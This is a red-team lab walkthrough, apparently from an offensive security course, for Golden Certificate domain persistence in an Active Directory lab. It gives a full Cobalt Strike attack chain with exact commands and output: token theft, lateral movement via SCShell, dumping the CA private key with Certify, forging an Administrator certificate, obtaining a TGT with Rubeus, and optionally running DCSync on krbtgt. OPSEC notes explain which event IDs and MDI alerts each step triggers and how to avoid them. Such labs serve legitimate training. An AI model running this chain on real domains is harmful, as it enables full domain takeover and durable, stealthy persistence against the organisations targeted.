# Domain Persistence Golden Certificates

>The objective of this lab is to leverage DPERSIST1 for domain admin **persistence**.
>Once you have SYSTEM access beacon on the Certificate Service server.

===

1. Launch Cobalt Strike and connect to the team server.
2. Use the high-integrity Beacon to impersonate a domain admin.  

On the existing beacon, open the process browser and find a process owned by dyork a domain admin on lon-wkstn-1

`process_browser`
Steal the token of that process:

`steal_token <pid>`
OPSEC-🟢SAFE — token impersonation in beacon thread, no process spawn.


3. Move laterally to *lon-cs-1*.

Load the SCShell Aggressor script.

Go to Cobalt Strike > Script Manager.  
Click Load.  
Select `C:\Tools\SCShell\CS-BOF\scshell.cna`.  
SCShell uses the service binary payload, so make sure to set the spawnto first.  

`ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`  

Move laterally to lon-cs-1  
  
`jump scshell64 lon-cs-1 smb`  

> **OPSEC-🟠CAUTION** — SCShell abuses `ChangeServiceConfigA` to temporarily overwrite an existing service's binary path, execute the payload, then restore it.  
> No new service created (**no Event 7045**), but generates **Event 7040** (service config changed) and a brief anomalous service execution.  
> SMB named pipe to SCM generates **Event 4624 Type 3** on target.  

> **Stealthier alternative:** `jump winrm64 lon-cs-1 smb` if WinRM is enabled on the CA server — no service modification, generates only Event 4624 Type 3.  
> Check first with `powerpick Test-WSMan lon-cs-1`.  

⚠️ A new SYSTEM Beacon should appear


4. Dump the CA's certificate.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
    ```

    > **OPSEC-🟠CAUTION** — `execute-assembly` spawns a sacrificial process.  
    > Certify accesses the CA private key via `ICertAdmin` COM interface under SYSTEM.  
    > Does not generate a CA audit event by default, but verbose CA logging may record it.  
    > May generate **Event 5061** (cryptographic operation) if CNG key auditing is active.  
    > Ensure `spawnto` is set to a low-profile binary (`dllhost.exe`) before this step.  

5. Save the certificate to your attacker desktop.  

    ```PowerShell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
    ```

    > **OPSEC-🟢SAFE** — Runs on the attacker desktop, not the target. No beacon action, no target disk write, no network event.

5. Use the certificate to force a user certificate for the default domain administrator account.  

    ```Terminal-nocolor
    C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
    ```

⚠️ Since this is forged, you can do this directly on the Attacker machine, rather than in Beacon.

> **OPSEC-🟢SAFE** — Runs entirely on the attacker desktop. No network traffic, no beacon action, nothing touches the target or the CA.  
> The forged cert is never submitted to the CA so **Events 4886/4887 are not generated**.  
> The only detectable moment is when the cert is used for PKINIT in step 6.  
>
> **Note:** The `--crl` flag embeds the CRL distribution point — the DC must reach that LDAP path to validate the cert during PKINIT.  
> If CRL checking fails, the AS-REQ will be rejected.

6. Use the forged certificate to request a TGT for Administrator.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
    ```

    > **OPSEC-🟠CAUTION** — `execute-assembly` spawns a sacrificial process. PKINIT AS-REQ generates **Event 4768** on the DC. A forged cert (not in the CA's issued cert database) used with PKINIT may trigger MDI's *Suspicious certificate usage over Kerberos protocol* detection. Using `/enctype:aes256` (not RC4) reduces additional signature risk. The forged cert base64 string is passed inline — nothing written to beacon host disk.
    
>Output:  

```
[04/14 11:33:32] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:MIACAQMwgAYJKoZIhvcNAQcBoI<SNIP>AAAAAAAAAAAAAAAAA /enctype:aes256 /nowrap
[04/14 11:33:39] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:MIACAQMwgAYJKoZIhvcNAQcB<SNIP>AAAAAAAAAAAAAAAAA /enctype:aes256 /nowrap
[04/14 11:33:42] [+] host called home, sent: 591476 bytes
[04/14 11:33:43] [+] job registered with id 1
[04/14 11:33:43] [+] [job 1] received output:
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT


[04/14 11:33:48] [+] [job 1] received output:
[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: DC=com, DC=contoso, CN=Users, CN=Administrator 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'CONTOSO\Administrator'
[*] Using domain controller: 10.10.120.1:88

[04/14 11:34:03] [+] [job 1] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGhjCCBoKgAwIBBaEDAgEWooIFjT<SNIP>09NqRwwGqADAgECoRMwERsGa3JidGd0GwdDT05UT1NP

  ServiceName              :  krbtgt/CONTOSO
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  14/04/2026 12:34:00
  EndTime                  :  14/04/2026 22:34:00
  RenewTill                :  21/04/2026 12:34:00
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  PoTe4xwS5G/yGRDXw5g/nilUs7QdzC8SHW7sL2yQnCc=
  ASREP (key)              :  AAA4ED1451C43968FB2D6209304C506FAFA3D0FE66020D1B672F905A359F4716

[04/14 11:34:03] [+] job 1 completed
```  

⚠️ In this lab, you have learned how to dump a CA's certificate and use it for elevated domain persistence.

===

## Proving Domain Admin Access with the Forged TGT

### Step 1 — Inject TGT into beacon session

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
```

> **OPSEC-🟢SAFE** — Injects the ticket into the beacon's current logon session in-memory. No disk write. No network traffic at injection time.
>
> **Stealthier alternative:** Append `/ptt` to the `asktgt` command in step 6 to inject immediately and skip this separate call entirely — one fewer `execute-assembly` invocation.

### Step 2 — Verify ticket loaded

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **OPSEC-🟢SAFE** — Local only, no network traffic. Confirm `Administrator @ CONTOSO.COM` is present and check expiry before using.

### Step 3 — List DC C$ (conclusive DA proof)

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-🟢SAFE** — `ls` uses the injected Kerberos ticket over SMB. Generates **Event 4624 Type 3** on the DC — identical to legitimate admin activity. No remote process spawn, no service creation. Access to `C$` on a DC requires DA or equivalent.

### Step 4 — Read flag from DC

```Beacon-nocolor
download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
```

> **OPSEC-🟢SAFE** — File pull over the existing beacon C2 channel. Generates **Event 4663** on DC only if Object Access auditing is enabled (not default).

### Step 5 — DCSync for krbtgt (only if Golden Ticket is the next objective)

```Beacon-nocolor
dcsync CONTOSO.COM\krbtgt
```

> **OPSEC-🟠CAUTION** — Generates **Event 4662** (DS replication access) on the DC. MDI specifically detects replication requests from non-DC sources. Do not use DCSync purely to prove DA — `ls \\dc\C$` is sufficient and far stealthier.

---

### DPERSIST1 Full Chain OPSEC Summary

| Stage | Action | OPSEC | Key Events |
|-------|--------|-------|------------|
| Token theft | `steal_token <pid>` | OPSEC-🟢SAFE | None — in-beacon thread |
| Lateral to CA | `jump scshell64` | OPSEC-🟠CAUTION | Event 7040 (svc config change), 4624 Type 3 |
| Lateral (alt) | `jump winrm64` | OPSEC-🟢SAFE | Event 4624 Type 3 only |
| Dump CA cert | `Certify manage-self --dump-certs` | OPSEC-🟠CAUTION | Event 5061 if CNG auditing active |
| Forge cert | `Certify forge` (attacker desktop) | OPSEC-🟢SAFE | No network, no target touch, no CA events |
| PKINIT TGT | `Rubeus asktgt /certificate:` | OPSEC-🟠CAUTION | Event 4768 — MDI alert for non-issued cert |
| Inject ticket | `Rubeus ptt` | OPSEC-🟢SAFE | None |
| Prove DA | `ls \\dc\C$` | OPSEC-🟢SAFE | Event 4624 Type 3 on DC |
| Read flag | `download \\dc\C$\...\root.txt` | OPSEC-🟢SAFE | Event 4663 on DC (if audited) |
| Cred harvest | `dcsync CONTOSO\krbtgt` | OPSEC-🟠CAUTION | Event 4662 on DC — MDI alert |

### Why Golden Certificates beat Golden Tickets for persistence

| Property | Golden Ticket | Golden Certificate (DPERSIST1) |
|----------|--------------|-------------------------------|
| Survives DA password reset | No | **Yes** |
| Survives krbtgt rotation | No | **Yes** |
| Requires CA private key | No | Yes — one-time dump needed |
| MDI detection vector | Ticket anomaly | PKINIT with non-CA-issued cert |
| Persistence duration | Ticket lifetime (max 10y) | CA cert lifetime (typically 5–10 years) |
